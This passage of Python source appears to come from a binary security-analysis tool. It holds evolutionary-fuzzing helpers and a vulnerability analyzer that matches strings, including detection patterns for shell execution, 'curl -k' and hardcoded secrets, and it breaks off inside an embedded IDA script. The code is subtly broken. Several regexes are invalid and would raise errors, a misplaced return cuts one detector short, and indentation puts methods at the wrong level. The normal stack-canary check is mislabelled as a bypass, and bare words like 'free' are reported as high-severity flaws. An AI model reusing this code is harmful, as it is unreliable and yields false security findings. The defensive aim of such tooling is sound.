    def _calculate_fitness(self, execution_result):
        """Calculate fitness score for evolutionary fuzzing."""
        fitness = 0

        # Reward crashes (exploration)
        if execution_result.get("crashed", False):
            fitness += 1000

        # Reward new coverage
        if execution_result.get("coverage_new", False):
            fitness += 500

        # Reward high coverage
        coverage = execution_result.get("coverage_percent", 0)
        fitness += coverage * 10

        # Penalize timeouts slightly
        if execution_result.get("timeout", False):
            fitness -= 50

        return max(0, fitness)

    def _tournament_selection(self, population, fitness_scores):
        """Tournament selection for evolutionary algorithm."""
        tournament_size = 3
        tournament = random.sample(list(zip(population, [s[1] for s in fitness_scores], strict=False)), tournament_size)
        return max(tournament, key=lambda x: x[1])[0]

    def _crossover(self, parent1, parent2):
        """Crossover operation for evolutionary fuzzing."""
        if len(parent1) == 0 or len(parent2) == 0:
            return parent1 if len(parent1) > 0 else parent2

        # Single-point crossover
        min_len = min(len(parent1), len(parent2))
        crossover_point = random.randint(1, min_len - 1)  # noqa: S311 - Genetic algorithm crossover point selection

        child = parent1[:crossover_point] + parent2[crossover_point:]
        return child

    def _mutate_individual(self, individual):
        """Mutation operation for evolutionary fuzzing."""
        if len(individual) == 0:
            return individual

        mutated = bytearray(individual)

        # Random mutation types
        mutation_type = random.randint(0, 4)  # noqa: S311 - Genetic algorithm mutation type selection

        if mutation_type == 0:  # Bit flip
            pos = random.randint(0, len(mutated) - 1)  # noqa: S311 - Genetic algorithm bit flip position
            bit = random.randint(0, 7)  # noqa: S311 - Genetic algorithm bit flip mask
            mutated[pos] ^= (1 << bit)

        elif mutation_type == 1:  # Byte replacement
            pos = random.randint(0, len(mutated) - 1)  # noqa: S311 - Genetic algorithm byte replacement position
            mutated[pos] = random.randint(0, 255)  # noqa: S311 - Genetic algorithm byte replacement value

        elif mutation_type == 2:  # Insert byte
            pos = random.randint(0, len(mutated))  # noqa: S311 - Genetic algorithm byte insertion position
            mutated.insert(pos, random.randint(0, 255))  # noqa: S311 - Genetic algorithm byte insertion value

        elif mutation_type == 3:  # Delete byte
            if len(mutated) > 1:
                pos = random.randint(0, len(mutated) - 1)  # noqa: S311 - Genetic algorithm byte deletion position
                del mutated[pos]

        elif mutation_type == 4:  # Dictionary injection
            if self.fuzzing_dict:
                token = random.choice(list(self.fuzzing_dict))  # noqa: S311 - Genetic algorithm dictionary token selection
                pos = random.randint(0, len(mutated))  # noqa: S311 - Genetic algorithm dictionary injection position
                if isinstance(token, str):
                    token = token.encode()
                mutated[pos:pos] = token

        return bytes(mutated)

    class FuzzingStrategy:
        """Fuzzing strategy enumeration for different approach types."""

        MUTATION_BASED = "mutation"
        GENERATION_BASED = "generation"
        HYBRID = "hybrid"
        AFL_PLUS_PLUS = "afl++"

    class CampaignStatus:
        """Fuzzing campaign status enumeration."""

        PENDING = "pending"
        RUNNING = "running"
        COMPLETED = "completed"
        FAILED = "failed"

    class AnalysisMethod:
        """Analysis method enumeration for vulnerability research."""

        STATIC = "static"
        DYNAMIC = "dynamic"
        SYMBOLIC = "symbolic"
        HYBRID = "hybrid"

    class VulnerabilityAnalyzer:
        """Advanced vulnerability analysis engine."""

        def __init__(self):
            """Advanced vulnerability analysis engine."""
            self.detection_modules = {
                "buffer_overflow": self._detect_buffer_overflow,
                "format_string": self._detect_format_string,
                "use_after_free": self._detect_use_after_free,
                "double_free": self._detect_double_free,
                "integer_overflow": self._detect_integer_overflow,
                "race_condition": self._detect_race_condition,
                "injection": self._detect_injection_vulns,
                "crypto_weakness": self._detect_crypto_weaknesses,
            }
            self.analysis_cache = {}

        def analyze(self, target_path, analysis_type="comprehensive", **kwargs):
            """Perform comprehensive vulnerability analysis."""
            try:
                import hashlib
                import os

                if not os.path.exists(target_path):
                    return {"error": "Target file not found", "vulnerabilities": []}

                # Generate cache key
                with open(target_path, "rb") as f:
                    file_hash = hashlib.sha256(f.read()).hexdigest()
                    cache_key = f"{file_hash}:{analysis_type}"

                if cache_key in self.analysis_cache:
                    return self.analysis_cache[cache_key]

                # Perform analysis
                results = {
                    "target": target_path,
                    "analysis_type": analysis_type,
                    "vulnerabilities": [],
                    "risk_score": 0.0,
                    "recommendations": [],
                    "metadata": self._analyze_metadata(target_path),
                }

                # Binary analysis
                with open(target_path, "rb") as f:
                    binary_data = f.read()

                # Run detection modules
                if analysis_type == "comprehensive":
                    modules_to_run = list(self.detection_modules.keys())
                else:
                    modules_to_run = (
                        [analysis_type] if analysis_type in self.detection_modules else []
                    )

                for module_name in modules_to_run:
                    try:
                        detector = self.detection_modules[module_name]
                        vulns = detector(binary_data, target_path, **kwargs)

                        for vuln in vulns:
                            vuln["detection_module"] = module_name
                            results["vulnerabilities"].append(vuln)

                    except Exception as e:
                        results["vulnerabilities"].append(
                            {
                                "type": "analysis_error",
                                "module": module_name,
                                "error": str(e),
                                "severity": "info",
                            },
                        )

                # Calculate overall risk score
                results["risk_score"] = self._calculate_risk_score(results["vulnerabilities"])

                # Generate recommendations
                results["recommendations"] = self._generate_recommendations(
                    results["vulnerabilities"]
                )

                # Cache results
                self.analysis_cache[cache_key] = results
                return results

            except Exception as e:
                return {"error": str(e), "vulnerabilities": []}

    def _analyze_metadata(self, file_path):
        """Analyze file metadata for security indicators."""
        import os
        import time

        stat = os.stat(file_path)

        return {
            "size": stat.st_size,
            "modified": time.ctime(stat.st_mtime),
            "permissions": oct(stat.st_mode)[-3:],
            "is_executable": os.access(file_path, os.X_OK),
            "file_type": self._detect_file_type(file_path),
        }

    def _detect_file_type(self, file_path):
        """Detect file type from headers."""
        try:
            with open(file_path, "rb") as f:
                header = f.read(16)

            if header.startswith(b"MZ"):
                return "PE"
            if header.startswith(b"\x7fELF"):
                return "ELF"
            if header.startswith(b"\xca\xfe\xba\xbe"):
                return "Mach-O"
            if header.startswith(b"PK"):
                return "ZIP/JAR"
            return "Unknown"

        except Exception:
            return "Unknown"

    def _detect_buffer_overflow(self, binary_data, file_path, **kwargs):
        """Detect potential buffer overflow vulnerabilities."""
        vulnerabilities = []

        # Look for dangerous functions
        dangerous_funcs = [
            b"strcpy",
            b"strcat",
            b"sprintf",
            b"gets",
            b"scanf",
            b"memcpy",
            b"memmove",
            b"strncpy",
            b"strncat",
        ]

        for func in dangerous_funcs:
            positions = []
            start = 0
            while True:
                pos = binary_data.find(func, start)
                if pos == -1:
                    break
                positions.append(pos)
                start = pos + 1

            if positions:
                vulnerabilities.append(
                    {
                        "type": "buffer_overflow_risk",
                        "function": func.decode("ascii", errors="ignore"),
                        "occurrences": len(positions),
                        "positions": positions[:10],  # Limit to first 10
                        "severity": "high"
                        if func in [b"strcpy", b"gets", b"sprintf"]
                        else "medium",
                        "description": f'Usage of dangerous function {func.decode("ascii", errors="ignore")} detected',
                        "exploit_potential": "high" if func == b"gets" else "medium",
                    },
                )

        # Look for stack canary bypass patterns
        canary_bypass_patterns = [
            b"\x8b\x45\xfc\x33\xc5",  # mov eax, [ebp-4]; xor eax, ebp (canary check)
            b"\x48\x8b\x45\xf8\x48\x33\xc4",  # x64 canary check
        ]

        for pattern in canary_bypass_patterns:
            if pattern in binary_data:
                vulnerabilities.append(
                    {
                        "type": "stack_protection_bypass",
                        "pattern": pattern.hex(),
                        "severity": "critical",
                        "description": "Potential stack canary bypass mechanism detected",
                        "exploit_potential": "critical",
                    },
                )

            return vulnerabilities

        def _detect_format_string(self, binary_data, file_path, **kwargs):
            """Detect format string vulnerabilities."""
            vulnerabilities = []

            # Look for printf family functions with user input
            printf_funcs = [b"printf", b"fprintf", b"sprintf", b"snprintf", b"vprintf"]
            format_patterns = [b"%s", b"%x", b"%p", b"%n", b"%d"]

            for func in printf_funcs:
                if func in binary_data:
                    # Check for format string patterns nearby
                    func_pos = binary_data.find(func)
                    if func_pos != -1:
                        # Look for format specifiers in nearby data
                        context_start = max(0, func_pos - 100)
                        context_end = min(len(binary_data), func_pos + 100)
                        context = binary_data[context_start:context_end]

                        found_patterns = []
                        for pattern in format_patterns:
                            if pattern in context:
                                found_patterns.append(pattern.decode("ascii"))

                        if found_patterns:
                            vulnerabilities.append(
                                {
                                    "type": "format_string_vulnerability",
                                    "function": func.decode("ascii"),
                                    "position": func_pos,
                                    "format_specifiers": found_patterns,
                                    "severity": "high" if b"%n" in context else "medium",
                                    "description": f'Format string vulnerability in {func.decode("ascii")}',
                                    "exploit_potential": "high" if b"%n" in context else "medium",
                                },
                            )

            return vulnerabilities

        def _detect_use_after_free(self, binary_data, file_path, **kwargs):
            """Detect use-after-free vulnerabilities."""
            vulnerabilities = []

            # Look for malloc/free patterns
            alloc_funcs = [b"malloc", b"calloc", b"realloc", b"new"]
            free_funcs = [b"free", b"delete"]

            # First, check if any allocation functions are present
            has_alloc_funcs = any(func in binary_data for func in alloc_funcs)
            if not has_alloc_funcs:
                return vulnerabilities  # No memory allocation, skip use-after-free detection

            # Simplified heuristic: look for free followed by potential use
            for free_func in free_funcs:
                free_positions = []
                start = 0
                while True:
                    pos = binary_data.find(free_func, start)
                    if pos == -1:
                        break
                    free_positions.append(pos)
                    start = pos + 1

                if free_positions:
                    vulnerabilities.append(
                        {
                            "type": "potential_use_after_free",
                            "free_function": free_func.decode("ascii"),
                            "free_occurrences": len(free_positions),
                            "severity": "high",
                            "description": "Memory deallocation detected - potential use-after-free risk",
                            "exploit_potential": "high",
                        },
                    )

            return vulnerabilities

        def _detect_double_free(self, binary_data, file_path, **kwargs):
            """Detect double-free vulnerabilities."""
            vulnerabilities = []

            # Look for multiple free calls in close proximity
            free_positions = []
            start = 0
            while True:
                pos = binary_data.find(b"free", start)
                if pos == -1:
                    break
                free_positions.append(pos)
                start = pos + 1

            # Check for close proximity frees (potential double free)
            for i in range(len(free_positions) - 1):
                if free_positions[i + 1] - free_positions[i] < 100:
                    vulnerabilities.append(
                        {
                            "type": "potential_double_free",
                            "positions": [free_positions[i], free_positions[i + 1]],
                            "severity": "high",
                            "description": "Multiple free calls in close proximity detected",
                            "exploit_potential": "high",
                        },
                    )

            return vulnerabilities

        def _detect_integer_overflow(self, binary_data, file_path, **kwargs):
            """Detect integer overflow vulnerabilities."""
            vulnerabilities = []

            # Look for arithmetic operations without bounds checking
            arithmetic_patterns = [
                b"\x01\xc0",  # add eax, eax
                b"\x29\xc0",  # sub eax, eax
                b"\xf7\xe0",  # mul eax
                b"\x48\x01\xc0",  # add rax, rax (x64)
            ]

            for pattern in arithmetic_patterns:
                if pattern in binary_data:
                    vulnerabilities.append(
                        {
                            "type": "integer_overflow_risk",
                            "pattern": pattern.hex(),
                            "severity": "medium",
                            "description": "Arithmetic operations detected - potential integer overflow",
                            "exploit_potential": "medium",
                        },
                    )

            return vulnerabilities

        def _detect_race_condition(self, binary_data, file_path, **kwargs):
            """Detect race condition vulnerabilities."""
            vulnerabilities = []

            # Look for threading and synchronization primitives
            threading_funcs = [
                b"pthread_create",
                b"CreateThread",
                b"mutex",
                b"semaphore",
                b"critical_section",
                b"WaitForSingleObject",
            ]

            found_threading = []
            for func in threading_funcs:
                if func in binary_data:
                    found_threading.append(func.decode("ascii", errors="ignore"))

            if found_threading:
                vulnerabilities.append(
                    {
                        "type": "race_condition_risk",
                        "threading_functions": found_threading,
                        "severity": "medium",
                        "description": "Multi-threading detected - potential race conditions",
                        "exploit_potential": "medium",
                    },
                )

            return vulnerabilities

        def _detect_injection_vulns(self, binary_data, file_path, **kwargs):
            """Detect injection vulnerabilities."""
            vulnerabilities = []

            # Look for system/exec calls
            exec_funcs = [b"system", b"exec", b"popen", b"ShellExecute", b"CreateProcess"]

            for func in exec_funcs:
                if func in binary_data:
                    vulnerabilities.append(
                        {
                            "type": "command_injection_risk",
                            "function": func.decode("ascii", errors="ignore"),
                            "severity": "critical",
                            "description": f'System execution function {func.decode("ascii", errors="ignore")} detected',
                            "exploit_potential": "critical",
                        },
                    )

            # Look for SQL-related strings
            sql_keywords = [b"SELECT", b"INSERT", b"UPDATE", b"DELETE", b"DROP", b"UNION"]
            found_sql = [kw.decode("ascii") for kw in sql_keywords if kw in binary_data]

            if found_sql:
                vulnerabilities.append(
                    {
                        "type": "sql_injection_risk",
                        "keywords": found_sql,
                        "severity": "high",
                        "description": "SQL keywords detected - potential SQL injection",
                        "exploit_potential": "high",
                    },
                )

            return vulnerabilities

        def _detect_crypto_weaknesses(self, binary_data, file_path, **kwargs):
            """Detect cryptographic weaknesses."""
            vulnerabilities = []

            # Look for weak crypto functions
            weak_crypto = [b"MD5", b"SHA1", b"DES", b"RC4", b"md5", b"sha1"]
            strong_crypto = [b"SHA256", b"SHA512", b"AES", b"RSA"]

            found_weak = [
                c.decode("ascii", errors="ignore") for c in weak_crypto if c in binary_data
            ]
            found_strong = [
                c.decode("ascii", errors="ignore") for c in strong_crypto if c in binary_data
            ]

            if found_weak:
                vulnerabilities.append(
                    {
                        "type": "weak_cryptography",
                        "weak_algorithms": found_weak,
                        "strong_algorithms": found_strong,  # Include strong algorithms for context
                        "severity": "medium",
                        "description": "Weak cryptographic algorithms detected",
                        "exploit_potential": "medium",
                    },
                )

            # Look for hardcoded keys/passwords
            key_patterns = [
                b"password",
                b"secret",
                b"key=",
                b"token=",
                b"Password",
                b"SECRET",
                b"KEY=",
                b"TOKEN=",
            ]

            found_secrets = []
            for pattern in key_patterns:
                if pattern in binary_data:
                    found_secrets.append(pattern.decode("ascii", errors="ignore"))

            if found_secrets:
                vulnerabilities.append(
                    {
                        "type": "hardcoded_secrets",
                        "patterns": found_secrets,
                        "severity": "high",
                        "description": "Potential hardcoded secrets detected",
                        "exploit_potential": "high",
                    },
                )

            return vulnerabilities

        def _calculate_risk_score(self, vulnerabilities):
            """Calculate overall risk score based on vulnerabilities."""
            if not vulnerabilities:
                return 0.0

            severity_weights = {
                "critical": 10.0,
                "high": 7.0,
                "medium": 4.0,
                "low": 1.0,
                "info": 0.1,
            }

            total_score = 0.0
            for vuln in vulnerabilities:
                severity = vuln.get("severity", "low")
                weight = severity_weights.get(severity, 1.0)
                total_score += weight

            # Normalize to 0-100 scale
            max_possible = len(vulnerabilities) * 10.0
            return min(100.0, (total_score / max_possible) * 100.0) if max_possible > 0 else 0.0

        def _generate_recommendations(self, vulnerabilities):
            """Generate security recommendations based on findings."""
            recommendations = []

            vuln_types = set(v.get("type", "") for v in vulnerabilities)

            if "buffer_overflow_risk" in vuln_types:
                recommendations.append(
                    {
                        "category": "Memory Safety",
                        "recommendation": "Replace dangerous functions with safer alternatives (strncpy, snprintf, etc.)",
                        "priority": "high",
                    },
                )

            if "format_string_vulnerability" in vuln_types:
                recommendations.append(
                    {
                        "category": "Input Validation",
                        "recommendation": "Use format string constants instead of user-controlled format strings",
                        "priority": "high",
                    },
                )

            if "weak_cryptography" in vuln_types:
                recommendations.append(
                    {
                        "category": "Cryptography",
                        "recommendation": "Upgrade to modern cryptographic algorithms (SHA-256, AES)",
                        "priority": "medium",
                    },
                )

            if "command_injection_risk" in vuln_types:
                recommendations.append(
                    {
                        "category": "Input Sanitization",
                        "recommendation": "Sanitize all user input before system execution",
                        "priority": "critical",
                    },
                )

            return recommendations

        # Enhanced Vulnerability Analysis - Advanced Techniques

        def _detect_advanced_race_conditions(self, target_path, **kwargs):
            """Advanced race condition detection using static and dynamic analysis."""
            vulnerabilities = []

            try:
                # Static analysis for common race condition patterns
                with open(target_path, "rb") as f:
                    binary_data = f.read()

                # Thread-unsafe patterns
                patterns = [
                    (b"pthread_create", "Thread creation without proper synchronization"),
                    (b"fork", "Process forking may introduce race conditions"),
                    (b"signal", "Signal handling without proper synchronization"),
                    (b"time", "Time-of-check to time-of-use vulnerability"),
                    (b"access", "Access check followed by use"),
                    (b"stat", "Stat followed by operation"),
                    (b"getuid", "UID check without proper locking"),
                    (b"setuid", "UID setting in multithreaded context")
                ]

                for pattern, description in patterns:
                    start = 0
                    positions = []
                    while True:
                        pos = binary_data.find(pattern, start)
                        if pos == -1:
                            break
                        positions.append(pos)
                        start = pos + 1

                    if len(positions) > 1:
                        # Multiple occurrences increase race condition probability
                        severity = "high" if len(positions) > 3 else "medium"
                        vulnerabilities.append({
                            "type": "race_condition_risk",
                            "pattern": pattern.decode('ascii', errors='ignore'),
                            "positions": positions,
                            "count": len(positions),
                            "description": description,
                            "severity": severity,
                            "exploit_potential": "medium",
                            "cwe": "CWE-362"
                        })

                # Check for TOCTOU vulnerabilities
                toctou_pairs = [
                    (b"access", b"open"),
                    (b"stat", b"fopen"),
                    (b"lstat", b"unlink"),
                    (b"readlink", b"open")
                ]

                for check_func, use_func in toctou_pairs:
                    check_positions = [m.start() for m in re.finditer(check_func, binary_data)]
                    use_positions = [m.start() for m in re.finditer(use_func, binary_data)]

                    for check_pos in check_positions:
                        for use_pos in use_positions:
                            # If use follows check within reasonable distance
                            if 0 < use_pos - check_pos < 1000:
                                vulnerabilities.append({
                                    "type": "toctou_vulnerability",
                                    "check_function": check_func.decode('ascii'),
                                    "use_function": use_func.decode('ascii'),
                                    "check_position": check_pos,
                                    "use_position": use_pos,
                                    "distance": use_pos - check_pos,
                                    "description": f"Time-of-check to time-of-use: {check_func.decode('ascii')} followed by {use_func.decode('ascii')}",
                                    "severity": "high",
                                    "exploit_potential": "high",
                                    "cwe": "CWE-367"
                                })

            except Exception as e:
                logger.error(f"Advanced race condition detection failed: {e}")

            return vulnerabilities

        def _detect_logic_flaws(self, target_path, **kwargs):
            """Detect logic flaws through static analysis and pattern matching."""
            vulnerabilities = []

            try:
                with open(target_path, "rb") as f:
                    binary_data = f.read()

                # Authentication bypass patterns
                auth_patterns = [
                    (b"strcmp.*password", "Password comparison may be vulnerable"),
                    (b"memcmp.*auth", "Authentication comparison may be flawed"),
                    (b"if.*admin", "Administrative check may be bypassable"),
                    (b"role.*==", "Role-based access control flaw"),
                    (b"permission.*check", "Permission check may be incomplete")
                ]

                for pattern_bytes, description in auth_patterns:
                    matches = list(re.finditer(pattern_bytes, binary_data, re.IGNORECASE))
                    if matches:
                        for match in matches:
                            vulnerabilities.append({
                                "type": "authentication_logic_flaw",
                                "position": match.start(),
                                "pattern": pattern_bytes.decode('ascii', errors='ignore'),
                                "description": description,
                                "severity": "high",
                                "exploit_potential": "medium",
                                "cwe": "CWE-287"
                            })

                # Integer handling logic flaws
                integer_patterns = [
                    (b"size.*-", "Size calculation with subtraction"),
                    (b"length.*+", "Length calculation with addition"),
                    (b"malloc.*size", "Memory allocation based on size"),
                    (b"realloc.*len", "Memory reallocation logic"),
                    (b"while.*count", "Loop with counter logic")
                ]

                for pattern_bytes, description in integer_patterns:
                    matches = list(re.finditer(pattern_bytes, binary_data, re.IGNORECASE))
                    if matches:
                        for match in matches:
                            vulnerabilities.append({
                                "type": "integer_logic_flaw",
                                "position": match.start(),
                                "pattern": pattern_bytes.decode('ascii', errors='ignore'),
                                "description": description,
                                "severity": "medium",
                                "exploit_potential": "medium",
                                "cwe": "CWE-190"
                            })

            except Exception as e:
                logger.error(f"Logic flaw detection failed: {e}")

            return vulnerabilities

        def _detect_memory_corruption_advanced(self, target_path, **kwargs):
            """Advanced memory corruption vulnerability detection."""
            vulnerabilities = []

            try:
                with open(target_path, "rb") as f:
                    binary_data = f.read()

                # Stack-based buffer overflow patterns
                stack_patterns = [
                    (b"gets", "Unbounded input to stack buffer"),
                    (b"scanf.*%s", "Format string reading to stack"),
                    (b"strcpy.*buf", "String copy to stack buffer"),
                    (b"strcat.*local", "String concatenation to local buffer"),
                    (b"sprintf.*stack", "Formatted string to stack buffer")
                ]

                for pattern_bytes, description in stack_patterns:
                    matches = list(re.finditer(pattern_bytes, binary_data, re.IGNORECASE))
                    for match in matches:
                        # Check for nearby stack frame setup
                        nearby_data = binary_data[max(0, match.start()-100):match.start()+100]
                        stack_setup = any(sig in nearby_data for sig in [b'push.*bp', b'mov.*sp', b'sub.*esp'])

                        vulnerabilities.append({
                            "type": "stack_buffer_overflow",
                            "position": match.start(),
                            "pattern": pattern_bytes.decode('ascii', errors='ignore'),
                            "description": description,
                            "stack_frame_detected": stack_setup,
                            "severity": "critical" if stack_setup else "high",
                            "exploit_potential": "high",
                            "cwe": "CWE-121"
                        })

                # Heap corruption patterns
                heap_patterns = [
                    (b"free.*ptr", "Heap memory deallocation"),
                    (b"realloc.*0", "Realloc with zero size"),
                    (b"malloc.*-1", "Malloc with invalid size"),
                    (b"calloc.*overflow", "Calloc integer overflow"),
                    (b"new.*delete", "C++ heap management")
                ]

                for pattern_bytes, description in heap_patterns:
                    matches = list(re.finditer(pattern_bytes, binary_data, re.IGNORECASE))
                    for match in matches:
                        vulnerabilities.append({
                            "type": "heap_corruption_risk",
                            "position": match.start(),
                            "pattern": pattern_bytes.decode('ascii', errors='ignore'),
                            "description": description,
                            "severity": "high",
                            "exploit_potential": "high",
                            "cwe": "CWE-416"
                        })

                # Use-after-free detection enhancement
                uaf_indicators = []
                free_positions = [m.start() for m in re.finditer(rb'free\(', binary_data)]
                use_positions = [m.start() for m in re.finditer(rb'->|*.*ptr|\[.*\]', binary_data)]

                for free_pos in free_positions:
                    for use_pos in use_positions:
                        if free_pos < use_pos < free_pos + 500:  # Use after free within 500 bytes
                            uaf_indicators.append({
                                "free_position": free_pos,
                                "use_position": use_pos,
                                "distance": use_pos - free_pos
                            })

                if uaf_indicators:
                    vulnerabilities.append({
                        "type": "use_after_free_advanced",
                        "indicators": uaf_indicators,
                        "count": len(uaf_indicators),
                        "description": f"Potential use-after-free: {len(uaf_indicators)} suspicious patterns",
                        "severity": "critical",
                        "exploit_potential": "high",
                        "cwe": "CWE-416"
                    })

            except Exception as e:
                logger.error(f"Advanced memory corruption detection failed: {e}")

            return vulnerabilities

        def _detect_crypto_implementation_flaws(self, target_path, **kwargs):
            """Detect cryptographic implementation vulnerabilities."""
            vulnerabilities = []

            try:
                with open(target_path, "rb") as f:
                    binary_data = f.read()

                # Weak cryptographic constants
                weak_crypto = [
                    (b"DES", "DES encryption (deprecated)"),
                    (b"MD5", "MD5 hashing (cryptographically broken)"),
                    (b"SHA1", "SHA-1 hashing (deprecated)"),
                    (b"RC4", "RC4 stream cipher (insecure)"),
                    (b"1024.*RSA", "RSA key too short"),
                    (b"rand().*key", "Weak random number generation for keys"),
                    (b"time.*seed", "Time-based seeding (predictable)"),
                    (b"ECB", "Electronic Codebook mode (vulnerable)")
                ]

                for pattern_bytes, description in weak_crypto:
                    matches = list(re.finditer(pattern_bytes, binary_data, re.IGNORECASE))
                    for match in matches:
                        vulnerabilities.append({
                            "type": "weak_cryptography_implementation",
                            "position": match.start(),
                            "algorithm": pattern_bytes.decode('ascii', errors='ignore'),
                            "description": description,
                            "severity": "high",
                            "exploit_potential": "medium",
                            "cwe": "CWE-327"
                        })

                # Hardcoded cryptographic material
                key_patterns = [
                    (b"key.*=.*\"", "Hardcoded encryption key"),
                    (b"password.*=.*\"", "Hardcoded password"),
                    (b"secret.*=.*\"", "Hardcoded secret"),
                    (b"salt.*=.*\"", "Hardcoded salt"),
                    (b"iv.*=.*\"", "Hardcoded initialization vector")
                ]

                for pattern_bytes, description in key_patterns:
                    matches = list(re.finditer(pattern_bytes, binary_data, re.IGNORECASE))
                    for match in matches:
                        # Extract potential hardcoded value
                        context = binary_data[match.start():match.start()+100]
                        vulnerabilities.append({
                            "type": "hardcoded_cryptographic_material",
                            "position": match.start(),
                            "pattern": pattern_bytes.decode('ascii', errors='ignore'),
                            "context": context.decode('ascii', errors='ignore')[:50],
                            "description": description,
                            "severity": "critical",
                            "exploit_potential": "high",
                            "cwe": "CWE-798"
                        })

                # Improper certificate validation
                cert_patterns = [
                    (b"SSL_CTX_set_verify.*NONE", "SSL certificate verification disabled"),
                    (b"curl.*-k", "cURL certificate verification disabled"),
                    (b"verify.*false", "Certificate verification explicitly disabled"),
                    (b"InsecureSkipVerify.*true", "Go TLS verification disabled")
                ]

                for pattern_bytes, description in cert_patterns:
                    matches = list(re.finditer(pattern_bytes, binary_data, re.IGNORECASE))
                    for match in matches:
                        vulnerabilities.append({
                            "type": "improper_certificate_validation",
                            "position": match.start(),
                            "pattern": pattern_bytes.decode('ascii', errors='ignore'),
                            "description": description,
                            "severity": "high",
                            "exploit_potential": "high",
                            "cwe": "CWE-295"
                        })

            except Exception as e:
                logger.error(f"Crypto implementation flaw detection failed: {e}")

            return vulnerabilities

        def _detect_injection_vulnerabilities_advanced(self, target_path, **kwargs):
            """Advanced injection vulnerability detection."""
            vulnerabilities = []

            try:
                with open(target_path, "rb") as f:
                    binary_data = f.read()

                # SQL injection patterns
                sql_patterns = [
                    (b"SELECT.*%s", "SQL query with string formatting"),
                    (b"INSERT.*%d", "SQL insert with parameter"),
                    (b"UPDATE.*+", "SQL update with concatenation"),
                    (b"DELETE.*WHERE.*%s", "SQL delete with user input"),
                    (b"exec.*sql", "Dynamic SQL execution"),
                    (b"mysql_query.*sprintf", "MySQL query with sprintf"),
                    (b"sqlite.*prepare", "SQLite prepared statement (check parameters)")
                ]

                for pattern_bytes, description in sql_patterns:
                    matches = list(re.finditer(pattern_bytes, binary_data, re.IGNORECASE))
                    for match in matches:
                        vulnerabilities.append({
                            "type": "sql_injection_risk",
                            "position": match.start(),
                            "pattern": pattern_bytes.decode('ascii', errors='ignore'),
                            "description": description,
                            "severity": "high",
                            "exploit_potential": "high",
                            "cwe": "CWE-89"
                        })

                # Command injection patterns
                command_patterns = [
                    (b"system.*%s", "System command with user input"),
                    (b"exec.*user", "Exec with user-controlled data"),
                    (b"popen.*input", "Pipe open with user input"),
                    (b"sh.*-c", "Shell execution with commands"),
                    (b"cmd.*%s", "Windows command execution"),
                    (b"CreateProcess.*user", "Windows process creation")
                ]

                for pattern_bytes, description in command_patterns:
                    matches = list(re.finditer(pattern_bytes, binary_data, re.IGNORECASE))
                    for match in matches:
                        vulnerabilities.append({
                            "type": "command_injection_risk",
                            "position": match.start(),
                            "pattern": pattern_bytes.decode('ascii', errors='ignore'),
                            "description": description,
                            "severity": "critical",
                            "exploit_potential": "high",
                            "cwe": "CWE-78"
                        })

                # LDAP injection patterns
                ldap_patterns = [
                    (b"ldap_search.*%s", "LDAP search with user input"),
                    (b"DirectorySearcher.*filter", "LDAP filter injection"),
                    (b"(&.*%s.*)", "LDAP filter concatenation")
                ]

                for pattern_bytes, description in ldap_patterns:
                    matches = list(re.finditer(pattern_bytes, binary_data, re.IGNORECASE))
                    for match in matches:
                        vulnerabilities.append({
                            "type": "ldap_injection_risk",
                            "position": match.start(),
                            "pattern": pattern_bytes.decode('ascii', errors='ignore'),
                            "description": description,
                            "severity": "medium",
                            "exploit_potential": "medium",
                            "cwe": "CWE-90"
                        })

            except Exception as e:
                logger.error(f"Advanced injection detection failed: {e}")

            return vulnerabilities

        def _ghidra_integration_analysis(self, target_path, **kwargs):
            """Integrate with Ghidra for advanced static analysis."""
            try:
                import json
                import subprocess
                import tempfile

                # Check if Ghidra is available
                ghidra_script_path = kwargs.get('ghidra_path')
                if not ghidra_script_path:
                    logger.info("Ghidra path not provided, skipping Ghidra analysis")
                    return []

                # Create temporary directory for analysis
                with tempfile.TemporaryDirectory() as temp_dir:
                    output_file = os.path.join(temp_dir, "ghidra_analysis.json")

                    # Ghidra headless analysis command
                    cmd = [
                        ghidra_script_path,
                        "-import", target_path,
                        "-postScript", "AnalyzeAllBinaryScript.py",
                        "-scriptPath", temp_dir,
                        "-readOnly",
                        "-noanalysis"
                    ]

                    # Run Ghidra analysis
                    result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        cmd,
                        capture_output=True,
                        text=True,
                        timeout=300,
                        cwd=temp_dir,
                        shell=False
                    )

                    if result.returncode == 0 and os.path.exists(output_file):
                        with open(output_file, 'r') as f:
                            ghidra_results = json.load(f)

                        # Process Ghidra analysis results
                        vulnerabilities = []

                        # Extract function analysis
                        for func in ghidra_results.get('functions', []):
                            if func.get('complexity_score', 0) > 100:
                                vulnerabilities.append({
                                    "type": "high_complexity_function",
                                    "function": func.get('name', 'unknown'),
                                    "address": func.get('address'),
                                    "complexity": func.get('complexity_score'),
                                    "description": f"Function with high cyclomatic complexity: {func.get('complexity_score')}",
                                    "severity": "medium",
                                    "exploit_potential": "low",
                                    "cwe": "CWE-1120"
                                })

                        # Extract cross-references
                        for xref in ghidra_results.get('cross_references', []):
                            if xref.get('type') == 'dangerous_function':
                                vulnerabilities.append({
                                    "type": "dangerous_function_call",
                                    "function": xref.get('target'),
                                    "caller": xref.get('source'),
                                    "address": xref.get('address'),
                                    "description": f"Call to dangerous function: {xref.get('target')}",
                                    "severity": "high",
                                    "exploit_potential": "medium",
                                    "cwe": "CWE-242"
                                })

                        return vulnerabilities

                    else:
                        logger.warning(f"Ghidra analysis failed: {result.stderr}")
                        return []

            except Exception as e:
                logger.error(f"Ghidra integration failed: {e}")
                return []

        def _ida_pro_integration(self, target_path, **kwargs):
            """Integrate with IDA Pro for advanced binary analysis."""
            try:
                import subprocess
                import tempfile

                # Check if IDA Pro is available
                ida_path = kwargs.get('ida_path')
                if not ida_path:
                    logger.info("IDA Pro path not provided, skipping IDA analysis")
                    return []

                # Create IDA script for analysis
                ida_script = '''
import idaapi
import idautils
import json
import os

def analyze_binary():
    results = {
        "functions": [],
        "strings": [],
        "imports": [],
        "vulnerabilities": []
    }

    # Analyze functions
    for func_addr in idautils.Functions():
        func_name = idaapi.get_func_name(func_addr)
        func = idaapi.get_func(func_addr)
        if func:
            results["functions"].append({
                "name": func_name,
                "address": hex(func_addr),
                "size": func.size()
            })

    # Check for dangerous functions
    dangerous_funcs = ['strcpy', 'strcat', 'sprintf', 'gets', 'scanf']
    for func_name in dangerous_funcs:
        func_addr = idaapi.get_name_ea(idaapi.BADADDR, func_name)
        if func_addr != idaapi.BADADDR:
            results["vulnerabilities"].append({
                "type": "dangerous_function_import",
                "function": func_name,
                "address": hex(func_addr),
